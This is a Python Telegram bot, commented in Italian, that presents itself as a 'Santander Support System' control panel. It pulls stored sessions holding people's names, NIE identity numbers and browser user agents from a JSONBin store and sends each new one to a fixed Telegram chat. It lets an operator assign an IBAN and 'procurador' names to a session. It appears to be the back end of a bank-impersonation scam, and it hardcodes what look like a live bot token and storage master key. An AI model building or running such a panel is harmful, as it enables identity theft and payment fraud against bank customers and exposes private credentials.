#!/usr/bin/env python3
"""
Bot Telegram per Santander Support System
Sincronizza con JSONBin.io per gestire le sessioni di supporto
"""

import requests
import json
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Configurazione
BOT_TOKEN = "8769459139:AAFTZL5K-rk7dHAngP8NfcdG0S4OjcOCGZw"
CHAT_ID = 8379210056
BIN_ID = "69c501f6c3097a1dd5605779"
MASTER_KEY = "$2a$10$RoiwGd894wsPzcL0d6AYtegWuH4z7zN1P09knFoJ/sP6fOaecTzm."
JSONBIN_URL = f"https://api.jsonbin.io/v3/b/{BIN_ID}"

# Headers per JSONBin
HEADERS = {
    "Content-Type": "application/json",
    "X-Master-Key": MASTER_KEY
}

def get_sessions():
    """Recupera le sessioni da JSONBin"""
    try:
        response = requests.get(JSONBIN_URL, headers=HEADERS)
        if response.status_code == 200:
            return response.json()["record"]["sessions"]
        return []
    except Exception as e:
        print(f"Errore nel recupero sessioni: {e}")
        return []

def update_session(session_id, iban, proc_nombre, proc_apellidos):
    """Aggiorna una sessione con i dati IBAN e procurador"""
    try:
        sessions = get_sessions()
        for session in sessions:
            if session["id"] == session_id:
                session["iban"] = iban
                session["proc_nombre"] = proc_nombre
                session["proc_apellidos"] = proc_apellidos
                session["status"] = "ready"
                break
        
        data = {"sessions": sessions}
        response = requests.put(JSONBIN_URL, json=data, headers=HEADERS)
        return response.status_code == 200
    except Exception as e:
        print(f"Errore nell'aggiornamento sessione: {e}")
        return False

def delete_session(session_id):
    """Elimina una sessione"""
    try:
        sessions = get_sessions()
        sessions = [s for s in sessions if s["id"] != session_id]
        data = {"sessions": sessions}
        response = requests.put(JSONBIN_URL, json=data, headers=HEADERS)
        return response.status_code == 200
    except Exception as e:
        print(f"Errore nell'eliminazione sessione: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start"""
    keyboard = [
        [InlineKeyboardButton("📋 Sessioni Pendenti", callback_data="list_pending")],
        [InlineKeyboardButton("✅ Tutte le Sessioni", callback_data="list_all")],
        [InlineKeyboardButton("➕ Nuova Sessione", callback_data="new_session")],
        [InlineKeyboardButton("⚙️ Impostazioni", callback_data="settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🏦 **Benvenuto nel Pannello Santander Support System**\n\n"
        "Seleziona un'azione:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def list_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE, filter_type="pending"):
    """Elenca le sessioni"""
    query = update.callback_query
    await query.answer()
    
    sessions = get_sessions()
    
    if filter_type == "pending":
        sessions = [s for s in sessions if s["status"] == "pending"]
        title = "📋 **Sessioni Pendenti**"
    else:
        title = "✅ **Tutte le Sessioni**"
    
    if not sessions:
        await query.edit_message_text(f"{title}\n\nNessuna sessione trovata.")
        return
    
    message = f"{title}\n\n"
    for i, session in enumerate(sessions, 1):
        message += f"**{i}. {session['nombre']} {session['apellidos']}**\n"
        message += f"   ID: `{session['id']}`\n"
        message += f"   NIE: {session['nie']}\n"
        message += f"   Status: {session['status']}\n"
        message += f"   Data: {session['timestamp']}\n\n"
    
    keyboard = [
        [InlineKeyboardButton("🔄 Aggiorna", callback_data=f"refresh_{filter_type}")],
        [InlineKeyboardButton("🔙 Indietro", callback_data="back_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(message, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestisce i pulsanti inline"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "list_pending":
        await list_sessions(update, context, "pending")
    elif query.data == "list_all":
        await list_sessions(update, context, "all")
    elif query.data == "refresh_pending":
        await list_sessions(update, context, "pending")
    elif query.data == "refresh_all":
        await list_sessions(update, context, "all")
    elif query.data == "back_menu":
        await start(update, context)
    elif query.data.startswith("send_iban_"):
        session_id = query.data.replace("send_iban_", "")
        context.user_data["current_session"] = session_id
        await query.edit_message_text(
            "Inserisci l'IBAN (formato: ES91 1234 5678 1234 5678 9012):"
        )
    elif query.data == "new_session":
        await query.edit_message_text(
            "Funzione di creazione manuale sessione.\n"
            "Inserisci i dati nel formato: Nome Cognome NIE"
        )

async def monitor_sessions(application: Application):
    """Monitora le nuove sessioni e invia notifiche"""
    last_count = 0
    
    while True:
        try:
            sessions = get_sessions()
            current_count = len(sessions)
            
            if current_count > last_count:
                new_sessions = sessions[last_count:]
                for session in new_sessions:
                    message = (
                        f"🔔 **Nuova Sessione Registrata**\n\n"
                        f"👤 Nome: {session['nombre']} {session['apellidos']}\n"
                        f"📋 NIE: {session['nie']}\n"
                        f"🆔 ID: `{session['id']}`\n"
                        f"⏰ Data: {session['timestamp']}\n"
                        f"🌐 User Agent: `{session['ua'][:50]}...`"
                    )
                    await application.bot.send_message(
                        chat_id=CHAT_ID,
                        text=message,
                        parse_mode="Markdown"
                    )
                last_count = current_count
            
            time.sleep(5)
        except Exception as e:
            print(f"Errore nel monitoraggio: {e}")
            time.sleep(5)

def main():
    """Avvia il bot"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Handler
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Avvia il bot
    print("🤖 Bot Telegram avviato...")
    application.run_polling()

if __name__ == "__main__":
    main()
